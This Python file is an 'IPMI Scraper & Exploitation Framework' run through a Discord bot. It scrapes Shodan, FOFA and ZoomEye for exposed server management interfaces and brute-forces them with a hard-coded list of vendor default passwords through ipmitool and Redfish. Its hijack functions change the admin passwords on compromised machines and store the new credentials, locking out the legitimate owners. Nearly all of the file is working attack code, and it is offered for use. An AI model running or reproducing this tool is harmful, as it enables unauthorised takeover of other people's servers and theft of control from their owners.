#!/usr/bin/env python3
"""
IPMI Scraper & Exploitation Framework v7.0
Recoded & Modified by omarikr (linux.developer.)
Made by GG!
"""

import aiohttp
from aiohttp import ClientTimeout, TCPConnector
import asyncio
from bs4 import BeautifulSoup
import re
from urllib.parse import urljoin, urlparse, urlencode, parse_qs, urlunparse
from datetime import datetime, timezone
from typing import Set, List, Dict, Optional
import discord
from discord.ext import commands
from discord.ui import Button, View, Select
import logging
import io
import hashlib
import sys
import argparse
import json
import sqlite3
import os
import pycountry
import random
import string
import time
import subprocess
import socket
import struct
from ipaddress import ip_address, AddressValueError
from pyfiglet import figlet_format
from colorama import Fore, Style, init
from pathlib import Path

current_unix_time = int(time.time())

# ==============================
# CONFIGURATION - Everything in one file
# ==============================
class Config:
    def __init__(self):
        self.DISCORD_BOT_TOKEN = "YOUR_DISCORD_BOT_TOKEN_HERE"
        self.OWNER_IDS = [123456789012345678]  # Replace with your Discord ID(s)
        
        # Channel IDs - set these after bot is running using !setstatus
        self.STATUS_CHANNEL_ID = None
        self.VULN_CHANNEL_ID = None
        self.HIJACK_CHANNEL_ID = None
        self.IPS_CHANNEL_ID = None
        
        # Scraper settings
        self.NODE_ID = "master"
        self.IPS_PER_PAGE = 20
        self.CYCLE_SLEEP = 10
        self.MAX_PAGES_PER_ENGINE = 2
        self.RESOURCE_SEMAPHORE = 10
        self.BATCH_SIZE = 2
        
        # Exploitation settings
        self.IPMI_DEFAULT_CREDS = [
            ("admin", "admin"),
            ("ADMIN", "ADMIN"),
            ("root", "admin"),
            ("root", "calvin"),
            ("USERID", "PASSW0RD"),
            ("admin", "password"),
            ("root", "changeme"),
            ("admin", "12345"),
            ("Administrator", "admin"),
            ("admin", "Admin@123"),
            ("root", "root"),
            ("admin", "Admin123"),
        ]
        
        # Redfish default creds for VPS hijacking
        self.REDFISH_DEFAULT_CREDS = [
            ("root", "calvin"),
            ("admin", "admin"),
            ("ADMIN", "ADMIN"),
            ("root", "admin"),
            ("admin", "Password123"),
        ]
        
        self.VULN_SCAN_TIMEOUT = 30
        self.HIJACK_PASS_LENGTH = 14
        self.PROXY_URL = "https://proxylist.geonode.com/api/proxy-list?limit=100&page=1&sort_by=lastChecked&sort_type=desc"
        
        self._ensure_files()

    def _ensure_files(self):
        for f in ["vulnerable.txt", "hijacked_systems.txt", "ipmi_ips.txt", "vps_hijacked.txt"]:
            Path(f).touch(exist_ok=True)

CONFIG = Config()

# ==============================
# LOGGING SETUP
# ==============================
class ImportantLogFilter(logging.Filter):
    def filter(self, record):
        important_keywords = [
            'failed', 'error', 'critical', 'warning', 'connected', 'disconnected',
            'Starting scrape cycle', 'Completed scrape cycle', 'Successfully saved',
            'Bot connected', 'status updated', 'Starting status update',
            'Vulnerable', 'Hijacked', 'Exploit', 'Success'
        ]
        return record.levelno != logging.INFO or any(keyword in record.getMessage().lower() for keyword in important_keywords)

class LogFormatter(logging.Formatter):
    LOG_TYPES = {
        'Successfully connected to SQLite': 'Database',
        'Failed to connect to SQLite': 'Database Error',
        'Database.*disconnected': 'Database Error',
        'Status channel updated': 'Status Update',
        'Successfully saved.*IPs': 'Database',
        'Failed to save': 'Database Error',
        'Starting scrape cycle': 'Scraper',
        'Completed scrape cycle': 'Scraper',
        'No new IPs': 'Scraper',
        'Non-200 response': 'Scraper Error',
        'Vulnerable': 'Vuln Scan',
        'Hijacked': 'Hijack',
        'Exploit': 'Exploit',
        'Success': 'Success'
    }
    def format(self, record):
        log_type = 'Info'
        for pattern, type_name in self.LOG_TYPES.items():
            if re.search(pattern, record.msg, re.IGNORECASE):
                log_type = type_name
                break
        return f"[{log_type}] {record.msg}"

logger = logging.getLogger('IPMI-Framework')
logger.setLevel(logging.INFO)
handler = logging.StreamHandler()
handler.setFormatter(LogFormatter())
handler.addFilter(ImportantLogFilter())
logger.addHandler(handler)

version = "7.0"  # Major update - Exploitation Framework
init(autoreset=True)

def print_banner():
    colors = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA, Fore.CYAN]
    random_color = random.choice(colors)
    title = figlet_format("IPMI Framework", font="slant")
    print(random_color + title)
    print(Style.RESET_ALL)
    print(f"{Fore.CYAN}[*] Recoded & Modified by omarikr (linux.developer.){Style.RESET_ALL}")
    print(f"{Fore.MAGENTA}[*] v{version} - Exploitation Framework | Made by GG!{Style.RESET_ALL}")
    print("\n" + "="*50 + "\n")

def print_startup_status(bot_user, db_connected):
    print(f"{Fore.GREEN}[*] Logged in as {bot_user}{Style.RESET_ALL}")
    if db_connected:
        print(f"{Fore.GREEN}[*] Connected to database.{Style.RESET_ALL}")
    else:
        print(f"{Fore.RED}[*] Failed to connect to database.{Style.RESET_ALL}")
    print(f"\n{Fore.CYAN}[*] System ready - All modules loaded{Style.RESET_ALL}")
    print("\n" + "="*50 + "\n")

# ==============================
# DATABASE MANAGER
# ==============================
class SQLiteManager:
    def __init__(self):
        self.db_path = 'ipmi_framework.db'
        self.conn = None
        self.connect()
        self.create_tables()

    def connect(self):
        try:
            self.conn = sqlite3.connect(self.db_path, check_same_thread=False)
            self.conn.row_factory = sqlite3.Row
            logger.info(f"Successfully connected to SQLite database: {self.db_path}")
        except Exception as e:
            logger.error(f"Failed to connect to SQLite: {e}")
            self.conn = None

    def get_connection(self):
        if self.conn is None:
            self.connect()
        return self.conn

    def create_tables(self):
        conn = self.get_connection()
        if not conn:
            return
        cursor = conn.cursor()
        try:
            # Scraped IPs
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS scraped_ips (
                    ip_address TEXT PRIMARY KEY,
                    source_url TEXT,
                    first_seen TEXT,
                    node_id TEXT,
                    ip_type TEXT,
                    source_type TEXT
                )
            ''')
            # Users
            cursor.execute('''CREATE TABLE IF NOT EXISTS users (
                discord_id INTEGER PRIMARY KEY,
                has_permission BOOLEAN DEFAULT 0,
                works BOOLEAN DEFAULT 1,
                username TEXT
            )''')
            # Vulnerable IPs
            cursor.execute('''CREATE TABLE IF NOT EXISTS vulnerable_ips (
                ip_address TEXT PRIMARY KEY,
                port INTEGER DEFAULT 623,
                service TEXT DEFAULT 'IPMI',
                vulnerability TEXT,
                detected_at TEXT,
                username TEXT,
                password TEXT
            )''')
            # Hijacked Systems
            cursor.execute('''CREATE TABLE IF NOT EXISTS hijacked_systems (
                ip_address TEXT PRIMARY KEY,
                username TEXT,
                password TEXT,
                hijacked_at TEXT,
                hijack_type TEXT,
                method TEXT
            )''')
            # VPS Hijacked
            cursor.execute('''CREATE TABLE IF NOT EXISTS vps_hijacked (
                ip_address TEXT PRIMARY KEY,
                username TEXT,
                password TEXT,
                hijacked_at TEXT,
                method TEXT
            )''')
            # Settings
            cursor.execute('''CREATE TABLE IF NOT EXISTS settings (key TEXT PRIMARY KEY, value TEXT)''')
            # Bot config
            cursor.execute('''CREATE TABLE IF NOT EXISTS bot_config (key TEXT PRIMARY KEY, value TEXT)''')
            # Nodes
            cursor.execute('''CREATE TABLE IF NOT EXISTS nodes (
                node_id TEXT PRIMARY KEY,
                status TEXT,
                ips_scraped INTEGER DEFAULT 0,
                last_seen TEXT,
                urls TEXT
            )''')
            
            conn.commit()
            logger.info("SQLite tables created successfully.")
        except Exception as e:
            logger.error(f"Error creating SQLite tables: {e}")
        finally:
            cursor.close()

    def execute(self, query, params=()):
        conn = self.get_connection()
        if not conn: return
        cursor = conn.cursor()
        try:
            cursor.execute(query, params)
            conn.commit()
        except Exception as e:
            logger.error(f"DB Execute error: {e}")
        finally:
            cursor.close()

    def executemany(self, query, params):
        conn = self.get_connection()
        if not conn: return 0
        cursor = conn.cursor()
        try:
            cursor.executemany(query, params)
            conn.commit()
            return cursor.rowcount
        finally:
            cursor.close()

    def fetchone(self, query, params=()):
        conn = self.get_connection()
        if not conn: return None
        cursor = conn.cursor()
        try:
            cursor.execute(query, params)
            return cursor.fetchone()
        finally:
            cursor.close()

    def fetchall(self, query, params=()):
        conn = self.get_connection()
        if not conn: return []
        cursor = conn.cursor()
        try:
            cursor.execute(query, params)
            return cursor.fetchall()
        finally:
            cursor.close()

db_manager = SQLiteManager()

# ==============================
# DISCORD BOT SETUP
# ==============================
intents = discord.Intents.default()
intents.message_content = True
intents.members = True
bot = commands.Bot(command_prefix='!', intents=intents)
bot.remove_command('help')
bot.last_status_message_id = None
bot.start_time = datetime.now(timezone.utc)

# ==============================
# HELPER FUNCTIONS
# ==============================
def generate_password(length=14) -> str:
    """Generate a strong random password"""
    chars = string.ascii_letters + string.digits + "!@#$%^&*"
    return ''.join(random.choice(chars) for _ in range(length))

def is_owner_check(ctx):
    return ctx.author.id in CONFIG.OWNER_IDS

def owner_only():
    async def predicate(ctx):
        if ctx.author.id not in CONFIG.OWNER_IDS:
            embed = discord.Embed(
                title="⛔ Access Denied",
                description="Only the bot owner can use this command.",
                color=discord.Color.red()
            )
            await ctx.send(embed=embed, delete_after=5)
            return False
        return True
    return commands.check(predicate)

async def has_id_permission(user_id: int) -> bool:
    user = db_manager.fetchone("SELECT * FROM users WHERE discord_id = ?", (user_id,))
    return user is not None and user['has_permission']

async def send_to_channel(channel_id_field: str, embed: discord.Embed, file: discord.File = None):
    """Send a message to a configured channel"""
    channel_id = CONFIG.__dict__.get(channel_id_field)
    if not channel_id:
        return
    channel = bot.get_channel(int(channel_id))
    if not channel:
        return
    try:
        if file:
            await channel.send(embed=embed, file=file)
        else:
            await channel.send(embed=embed)
    except Exception as e:
        logger.error(f"Failed to send to channel {channel_id_field}: {e}")

# ==============================
# IPMI EXPLOITATION ENGINE
# ==============================
class IPMIExploitEngine:
    def __init__(self):
        self.default_creds = CONFIG.IPMI_DEFAULT_CREDS
        self.redfish_creds = CONFIG.REDFISH_DEFAULT_CREDS
        self.scan_results = {}
        
    async def check_ipmi_port(self, ip: str, port: int = 623, timeout: int = 5) -> bool:
        """Check if IPMI port is open"""
        try:
            _, writer = await asyncio.wait_for(
                asyncio.open_connection(ip, port),
                timeout=timeout
            )
            writer.close()
            await writer.wait_closed()
            return True
        except:
            return False

    async def check_ipmi_http_interface(self, session: aiohttp.ClientSession, ip: str) -> tuple:
        """Check if IPMI web interface is accessible"""
        urls_to_check = [
            f"https://{ip}:443",
            f"https://{ip}:8443",
            f"http://{ip}:80",
            f"https://{ip}:443/",
            f"http://{ip}:80/",
        ]
        
        for url in urls_to_check:
            try:
                async with session.get(url, timeout=ClientTimeout(total=5), ssl=False) as response:
                    if response.status in [200, 401, 403]:
                        text = await response.text()
                        # Check for IPMI/BMC indicators
                        indicators = ['IPMI', 'BMC', 'Supermicro', 'iLO', 'iDRAC', 'iKVM', 
                                     'RACADM', 'Remote Management', 'System Management',
                                     'Login', 'password', 'admin']
                        found = [i for i in indicators if i.lower() in text.lower()]
                        if found:
                            return (url, found)
            except:
                continue
        return (None, [])

    async def try_default_creds(self, session: aiohttp.ClientSession, ip: str, port: int = 623) -> Optional[tuple]:
        """Try default IPMI credentials using ipmitool if available, else via HTTP"""
        # First check if ipmitool is available
        ipmitool_available = self._check_ipmitool()
        
        if ipmitool_available:
            for username, password in self.default_creds:
                try:
                    cmd = f"ipmitool -I lanplus -H {ip} -U {username} -P {password} chassis power status 2>&1"
                    proc = await asyncio.create_subprocess_shell(
                        cmd,
                        stdout=asyncio.subprocess.PIPE,
                        stderr=asyncio.subprocess.PIPE
                    )
                    stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=10)
                    output = stdout.decode() + stderr.decode()
                    
                    if "Chassis Power" in output or "on" in output.lower() or "off" in output.lower():
                        logger.info(f"[+] IPMI Default creds worked on {ip} - {username}:{password}")
                        return (username, password)
                except:
                    continue
        
        # Also try HTTP interfaces
        url, indicators = await self.check_ipmi_http_interface(session, ip)
        if url and indicators:
            for username, password in self.default_creds:
                try:
                    async with session.post(
                        url.replace('https://', 'https://').replace('http://', 'http://'),
                        json={"username": username, "password": password},
                        timeout=ClientTimeout(total=5),
                        ssl=False
                    ) as resp:
                        if resp.status == 200:
                            logger.info(f"[+] IPMI HTTP creds worked on {ip} - {username}:{password}")
                            return (username, password)
                except:
                    continue
        
        return None

    def _check_ipmitool(self) -> bool:
        """Check if ipmitool is installed"""
        try:
            subprocess.run(["ipmitool", "--version"], capture_output=True, timeout=5)
            return True
        except:
            return False

    async def scan_vulnerability(self, session: aiohttp.ClientSession, ip: str) -> dict:
        """Scan a single IP for IPMI vulnerabilities"""
        result = {
            "ip": ip,
            "vulnerable": False,
            "vulnerabilities": [],
            "open_ports": [],
            "default_creds": None,
            "http_interfaces": []
        }
        
        # Check common IPMI ports
        ports_to_check = [623, 443, 80, 8443, 5900, 5901]
        for port in ports_to_check:
            if await self.check_ipmi_port(ip, port, timeout=3):
                result["open_ports"].append(port)
        
        if not result["open_ports"]:
            return result
        
        result["vulnerable"] = True
        result["vulnerabilities"].append("IPMI ports exposed")
        
        # Check for default credentials
        creds = await self.try_default_creds(session, ip)
        if creds:
            result["default_creds"] = creds
            result["vulnerabilities"].append(f"Default credentials: {creds[0]}:{creds[1]}")
        
        # Check HTTP interface
        url, indicators = await self.check_ipmi_http_interface(session, ip)
        if url:
            result["http_interfaces"].append({"url": url, "indicators": indicators})
            result["vulnerabilities"].append(f"Web interface accessible: {url}")
        
        return result

    async def hijack_system(self, ip: str, username: str = "admin", password: str = None) -> dict:
        """Hijack an IPMI system - change password and take control"""
        result = {
            "ip": ip,
            "success": False,
            "old_password": password,
            "new_password": None,
            "username": username,
            "method": "none",
            "details": ""
        }
        
        if not password:
            # Try default creds
            async with aiohttp.ClientSession() as session:
                creds = await self.try_default_creds(session, ip)
                if creds:
                    username, password = creds
        
        if not password:
            result["details"] = "Could not find valid credentials"
            return result
        
        new_pass = generate_password(CONFIG.HIJACK_PASS_LENGTH)
        result["new_password"] = new_pass
        
        # Attempt password change via ipmitool
        if self._check_ipmitool():
            try:
                # Try to change password via IPMI
                # First, get user ID
                cmd_list = f"ipmitool -I lanplus -H {ip} -U {username} -P {password} user list 2>&1"
                proc = await asyncio.create_subprocess_shell(
                    cmd_list,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE
                )
                stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=10)
                output = stdout.decode()
                
                # Extract user ID for admin (usually 2)
                user_id = 2
                for line in output.split('\n'):
                    if 'admin' in line.lower() or username.lower() in line.lower():
                        parts = line.strip().split()
                        if parts and parts[0].isdigit():
                            user_id = int(parts[0])
                            break
                
                # Change password
                cmd_change = f"ipmitool -I lanplus -H {ip} -U {username} -P {password} user set password {user_id} {new_pass} 2>&1"
                proc = await asyncio.create_subprocess_shell(
                    cmd_change,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE
                )
                stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=10)
                change_output = stdout.decode() + stderr.decode()
                
                if "Unable" not in change_output:
                    result["success"] = True
                    result["method"] = "ipmitool_password_change"
                    result["details"] = f"Password changed via IPMI. User ID: {user_id}"
                    
                    # Verify new password works
                    cmd_verify = f"ipmitool -I lanplus -H {ip} -U {username} -P {new_pass} chassis power status 2>&1"
                    proc = await asyncio.create_subprocess_shell(
                        cmd_verify,
                        stdout=asyncio.subprocess.PIPE,
                        stderr=asyncio.subprocess.PIPE
                    )
                    stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=10)
                    verify_output = stdout.decode()
                    
                    if "Chassis Power" in verify_output:
                        result["details"] += " | Verified: New credentials work"
                        logger.info(f"[+] SUCCESS: System {ip} hijacked via IPMI! New pass: {new_pass}")
                    else:
                        result["details"] += " | Warning: Could not verify new credentials"
                else:
                    result["details"] = f"Failed to change password: {change_output[:100]}"
                    
            except Exception as e:
                result["details"] = f"IPMI error: {str(e)[:100]}"
        else:
            result["details"] = "ipmitool not installed on system"
        
        return result

    async def hijack_vps_redfish(self, session: aiohttp.ClientSession, ip: str) -> dict:
        """Hijack VPS using Redfish API (Dell iDRAC, HP iLO, etc.)"""
        result = {
            "ip": ip,
            "success": False,
            "username": None,
            "password": None,
            "method": "redfish",
            "details": ""
        }
        
        redfish_urls = [
            f"https://{ip}/redfish/v1",
            f"https://{ip}:443/redfish/v1",
            f"https://{ip}:8443/redfish/v1",
        ]
        
        for base_url in redfish_urls:
            for username, password in self.redfish_creds:
                try:
                    auth = aiohttp.BasicAuth(username, password)
                    async with session.get(
                        base_url,
                        auth=auth,
                        timeout=ClientTimeout(total=5),
                        ssl=False
                    ) as resp:
                        if resp.status == 200:
                            new_pass = generate_password(CONFIG.HIJACK_PASS_LENGTH)
                            
                            # Try to change password via Redfish API
                            # First, get the account service URL
                            data = await resp.json()
                            account_service_url = data.get("Links", {}).get(
                                "AccountService", {}).get("@odata.id", "")
                            
                            if account_service_url:
                                accounts_url = urljoin(base_url, account_service_url)
                                async with session.get(
                                    accounts_url,
                                    auth=auth,
                                    ssl=False
                                ) as acc_resp:
                                    if acc_resp.status == 200:
                                        acc_data = await acc_resp.json()
                                        manager_accounts = acc_data.get("Members", [])
                                        
                                        for account in manager_accounts:
                                            account_url = urljoin(base_url, account.get("@odata.id", ""))
                                            patch_data = {"Password": new_pass}
                                            
                                            async with session.patch(
                                                account_url,
                                                auth=auth,
                                                json=patch_data,
                                                ssl=False
                                            ) as patch_resp:
                                                if patch_resp.status in [200, 204]:
                                                    result["success"] = True
                                                    result["username"] = username
                                                    result["password"] = new_pass
                                                    result["details"] = f"Password changed via Redfish API"
                                                    logger.info(f"[+] VPS {ip} hijacked via Redfish! New creds: {username}:{new_pass}")
                                                    return result
                            
                            # If we can't change via Redfish, at least we have access
                            result["success"] = True
                            result["username"] = username
                            result["password"] = password
                            result["details"] = "Redfish access confirmed (password unchanged)"
                            return result
                            
                except:
                    continue
        
        result["details"] = "No valid Redfish credentials found"
        return result


# ==============================
# IP SCRAPER
# ==============================
class IPScraper:
    def __init__(self, node_id: str):
        self.node_id = node_id
        specific_urls = [
            "https://en.fofa.info/result?qbase64=c3VwZXJtaWNybw%3D%3D",
            "https://en.fofa.info/result?qbase64=ImlwbWkiICYmIHBvcnQ9IjQ0MyI%3D",
            "https://www.shodan.io/search?query=ipmi",
            "https://www.shodan.io/search?query=supermicro",
            "https://www.zoomeye.ai/searchResult?q=IlN1cGVybWljcm8gQ29tcHV0ZXIi",
            "https://www.zoomeye.ai/searchResult?q=ImlwbWkiICYmIHBvcnQ9IjQ0MyI%3D&t=v4"
        ]
        self.urls = specific_urls
        self.all_ips: Set[str] = set()
        self.pending_ip_data: List[dict] = []
        self.failed_pages: List[str] = []
        self.errors: List[str] = []
        self.ips_scraped = 0
        self.batch_size = CONFIG.BATCH_SIZE
        self.max_pages = CONFIG.MAX_PAGES_PER_ENGINE
        self.cycle_sleep = CONFIG.CYCLE_SLEEP
        self.resource_semaphore = asyncio.Semaphore(CONFIG.RESOURCE_SEMAPHORE)
        self.ip_pattern = re.compile(r'\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b')
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0'
        ]
        self.proxies = []
        
        # Initialize IPs from database
        asyncio.get_event_loop().run_until_complete(self.init_ips())

    async def init_ips(self):
        try:
            for row in db_manager.fetchall("SELECT ip_address FROM scraped_ips"):
                ip = row["ip_address"]
                if self.is_valid_ip(ip):
                    self.all_ips.add(ip)
            logger.info(f"Node {self.node_id}: Initialized with {len(self.all_ips)} valid IPs from database")
        except Exception as e:
            logger.error(f"Node {self.node_id}: Failed to initialize IPs from database: {e}")

    async def fetch_proxies(self, session: aiohttp.ClientSession):
        try:
            async with session.get(CONFIG.PROXY_URL, timeout=ClientTimeout(total=30)) as response:
                if response.status == 200:
                    json_data = await response.json()
                    self.proxies = [f"{item['ip']}:{item['port']}" for item in json_data.get('data', [])]
                    logger.info(f"Node {self.node_id}: Fetched {len(self.proxies)} HTTP proxies")
                else:
                    logger.warning(f"Node {self.node_id}: Failed to fetch proxies (status: {response.status})")
        except Exception as e:
            logger.error(f"Node {self.node_id}: Error fetching proxies: {e}")

    def normalize_ip(self, ip: str) -> str | None:
        parts = ip.split('.')
        if len(parts) != 4:
            return None
        normalized_parts = []
        for part in parts:
            stripped = part.lstrip('0')
            if stripped == '':
                stripped = '0'
            try:
                num = int(stripped)
                if 0 <= num <= 255:
                    normalized_parts.append(str(num))
                else:
                    return None
            except ValueError:
                return None
        return '.'.join(normalized_parts)

    def is_valid_ip(self, ip: str) -> bool:
        normalized = self.normalize_ip(ip)
        if not normalized:
            return False
        try:
            ip_obj = ip_address(normalized)
            if ip_obj.is_private or ip_obj.is_loopback or ip_obj.is_unspecified:
                return False
            return True
        except AddressValueError:
            return False

    async def save_to_db_bulk(self, ip_data: List[dict]) -> int:
        try:
            unique_ip_data = []
            seen_ips = set()
            for item in ip_data:
                ip = item['ip_address']
                if not self.is_valid_ip(ip):
                    continue
                normalized_ip = self.normalize_ip(ip)
                item['ip_address'] = normalized_ip
                if normalized_ip not in seen_ips and normalized_ip not in self.all_ips:
                    unique_ip_data.append(item)
                    seen_ips.add(normalized_ip)
            if not unique_ip_data:
                return 0
            params_to_insert = [
                (d['ip_address'], d['source_url'], d['first_seen'].isoformat(), d['node_id'], d['ip_type'], d['source_type'])
                for d in unique_ip_data
            ]
            inserted_count = db_manager.executemany(
                "INSERT OR IGNORE INTO scraped_ips (ip_address, source_url, first_seen, node_id, ip_type, source_type) VALUES (?, ?, ?, ?, ?, ?)",
                params_to_insert
            )
            if inserted_count > 0:
                logger.info(f"Node {self.node_id}: Successfully saved {inserted_count} new IPs.")
                self.ips_scraped += inserted_count
                self.all_ips.update(item['ip_address'] for item in unique_ip_data)
                try:
                    with open('ipmi_ips.txt', 'a') as f:
                        for item in unique_ip_data:
                            f.write(f"{item['ip_address']}\n")
                except Exception as e:
                    logger.error(f"Node {self.node_id}: Failed to write to ips.txt: {e}")
            return inserted_count
        except Exception as e:
            logger.error(f"Node {self.node_id}: General save error: {e}")
            self.errors.append(f"General Save Error: {str(e)}")
            self.pending_ip_data.extend(ip_data)
            return 0

    def build_page_url(self, base_url: str, domain: str, page_num: int) -> str:
        parsed = urlparse(base_url)
        query_params = parse_qs(parsed.query)
        page_params = {
            "shodan.io": {"page": [str(page_num)]},
            "fofa.info": {"page": [str(page_num)]},
            "zoomeye.ai": {"p": [str(page_num)]}
        }
        if domain in page_params:
            for key, val in page_params[domain].items():
                query_params[key] = val
        new_query = urlencode(query_params, doseq=True)
        new_parsed = parsed._replace(query=new_query)
        return urlunparse(new_parsed)

    async def fetch_page(self, session: aiohttp.ClientSession, url: str, page_num: int = 1) -> tuple:
        domain = urlparse(url).netloc
        page_url = self.build_page_url(url, domain, page_num)
        max_retries = 10
        for attempt in range(max_retries):
            headers = {
                'User-Agent': random.choice(self.user_agents),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5'
            }
            proxy = f"http://{random.choice(self.proxies)}" if self.proxies else None
            try:
                async with session.get(page_url, headers=headers, proxy=proxy, timeout=ClientTimeout(total=30)) as response:
                    if response.status == 200:
                        logger.info(f"Node {self.node_id}: Successfully fetched {page_url}")
                        return (url, await response.text())
                    elif response.status == 429:
                        retry_after = response.headers.get('Retry-After')
                        base_wait = 2 ** attempt
                        if 'shodan' in domain:
                            base_wait *= 2
                        wait_time = base_wait + random.uniform(1, 3)
                        if retry_after:
                            try:
                                wait_time = min(float(retry_after), 120) + random.uniform(0.5, 1.0)
                            except ValueError:
                                pass
                        await asyncio.sleep(wait_time)
                        continue
                    else:
                        logger.warning(f"Node {self.node_id}: Non-200 response for {page_url}: {response.status}")
                        await asyncio.sleep(2 ** attempt + random.uniform(0.5, 1.5))
                        continue
            except Exception as e:
                if attempt < max_retries - 1:
                    await asyncio.sleep(2 ** attempt + random.uniform(0.5, 1.5))
        self.failed_pages.append(page_url)
        return (url, "")

    async def fetch_resource(self, session, resource_url, semaphore):
        async with semaphore:
            proxy = f"http://{random.choice(self.proxies)}" if self.proxies else None
            headers = {'User-Agent': random.choice(self.user_agents)}
            try:
                async with session.get(resource_url, headers=headers, proxy=proxy, timeout=ClientTimeout(total=20)) as resp:
                    if resp.status == 200:
                        return await resp.text()
            except Exception:
                pass
            return ""

    async def scan_url(self, session: aiohttp.ClientSession, url: str, max_pages: int = 1) -> None:
        try:
            is_search_engine = any(domain in url for domain in ["shodan.io", "fofa.info", "zoomeye.ai"])
            tasks = [self.fetch_page(session, url, page) for page in range(1, min(max_pages, self.max_pages) + 1)] if is_search_engine else [self.fetch_page(session, url)]
            results = await asyncio.gather(*tasks, return_exceptions=True)
            new_ip_data = []
            for result in results:
                if isinstance(result, Exception):
                    continue
                source_url, content = result
                if not content:
                    continue
                soup = await asyncio.get_event_loop().run_in_executor(None, BeautifulSoup, content, 'html.parser')
                html_text = soup.get_text(separator=' ')
                
                # Extract all IPs
                all_ips_in_page = set()
                for match in self.ip_pattern.finditer(html_text):
                    ip = match.group()
                    normalized = self.normalize_ip(ip)
                    if normalized and self.is_valid_ip(normalized):
                        all_ips_in_page.add(normalized)
                
                # Check CSS
                style_tags = soup.find_all('style')
                for style in style_tags:
                    if style.string:
                        for match in self.ip_pattern.finditer(style.string):
                            ip = match.group()
                            normalized = self.normalize_ip(ip)
                            if normalized and self.is_valid_ip(normalized):
                                all_ips_in_page.add(normalized)
                
                # Check JS
                script_tags = soup.find_all('script')
                for script in script_tags:
                    if script.string:
                        for match in self.ip_pattern.finditer(script.string):
                            ip = match.group()
                            normalized = self.normalize_ip(ip)
                            if normalized and self.is_valid_ip(normalized):
                                all_ips_in_page.add(normalized)
                
                new_ips = all_ips_in_page - self.all_ips
                if new_ips:
                    current_time = datetime.now(timezone.utc)
                    new_ip_data.extend({
                        "ip_address": ip,
                        "source_url": source_url,
                        "first_seen": current_time,
                        "node_id": self.node_id,
                        "ip_type": "IPMI" if "ipmi" in source_url.lower() else "Server",
                        "source_type": "HTML"
                    } for ip in new_ips)
            
            if new_ip_data:
                await self.save_to_db_bulk(new_ip_data)
        except Exception as e:
            logger.error(f"Node {self.node_id}: Error scanning URL {url}: {e}")

    async def run(self):
        connector = TCPConnector(limit=50)
        async with aiohttp.ClientSession(connector=connector) as session:
            await self.fetch_proxies(session)
            while True:
                try:
                    logger.info(f"Node {self.node_id}: Starting scrape cycle with {len(self.urls)} URLs")
                    
                    # Retry pending data
                    if self.pending_ip_data:
                        pending_count = await self.save_to_db_bulk(self.pending_ip_data)
                        if pending_count > 0:
                            self.pending_ip_data = []
                    
                    # Retry failed pages
                    if self.failed_pages:
                        retry_tasks = [self.scan_url(session, failed_url, 1) for failed_url in self.failed_pages[:3]]
                        await asyncio.gather(*retry_tasks, return_exceptions=True)
                        self.failed_pages = self.failed_pages[3:]
                    
                    # Process URLs in batches
                    for i in range(0, len(self.urls), self.batch_size):
                        batch_urls = self.urls[i:i + self.batch_size]
                        tasks = [
                            self.scan_url(
                                session,
                                url,
                                self.max_pages if any(d in url for d in ["shodan.io", "fofa.info", "zoomeye.ai"]) else 1
                            ) for url in batch_urls
                        ]
                        await asyncio.gather(*tasks, return_exceptions=True)
                    
                    # Update node status
                    db_manager.execute(
                        "INSERT OR REPLACE INTO nodes (node_id, status, ips_scraped, last_seen, urls) VALUES (?, ?, ?, ?, ?)",
                        (self.node_id, 'active', self.ips_scraped, datetime.now(timezone.utc).isoformat(), json.dumps(self.urls))
                    )
                    
                    logger.info(f"Node {self.node_id}: Completed scrape cycle, waiting {self.cycle_sleep} seconds")
                    await asyncio.sleep(self.cycle_sleep)
                except Exception as e:
                    logger.error(f"Node {self.node_id}: Scraper loop error: {e}")
                    await asyncio.sleep(30)


# ==============================
# DISCORD COMMANDS
# ==============================

class IPView(View):
    def __init__(self, ip_list: List[str], user_id: int, filename: str):
        super().__init__(timeout=180)
        self.ip_list = ip_list
        self.user_id = user_id
        self.filename = filename
        self.current_page = 0
        self.total_pages = (len(ip_list) - 1) // CONFIG.IPS_PER_PAGE + 1 if ip_list else 1
        if self.total_pages <= 1:
            self.children[0].disabled = True
            self.children[1].disabled = True

    def get_page_content(self) -> discord.Embed:
        start_idx = self.current_page * CONFIG.IPS_PER_PAGE
        end_idx = start_idx + CONFIG.IPS_PER_PAGE
        page_ips = self.ip_list[start_idx:end_idx]
        embed = discord.Embed(
            title=f"IP Collection (Page {self.current_page + 1}/{self.total_pages})",
            color=0x2E2E38,
            description="```css\n" + "\n".join(page_ips) + "\n```" if page_ips else "No IPs"
        )
        embed.set_footer(text=f"Total IPs: {len(self.ip_list)} | VERSION: {version} | Made by GG!")
        return embed

    @discord.ui.button(label="Previous", style=discord.ButtonStyle.grey)
    async def previous_button(self, interaction: discord.Interaction, button: Button):
        if interaction.user.id != self.user_id:
            await interaction.response.send_message("You don't control this!", ephemeral=True)
            return
        self.current_page = max(0, self.current_page - 1)
        await interaction.response.edit_message(embed=self.get_page_content(), view=self)

    @discord.ui.button(label="Next", style=discord.ButtonStyle.grey)
    async def next_button(self, interaction: discord.Interaction, button: Button):
        if interaction.user.id != self.user_id:
            await interaction.response.send_message("You don't control this!", ephemeral=True)
            return
        self.current_page = min(self.total_pages - 1, self.current_page + 1)
        await interaction.response.edit_message(embed=self.get_page_content(), view=self)

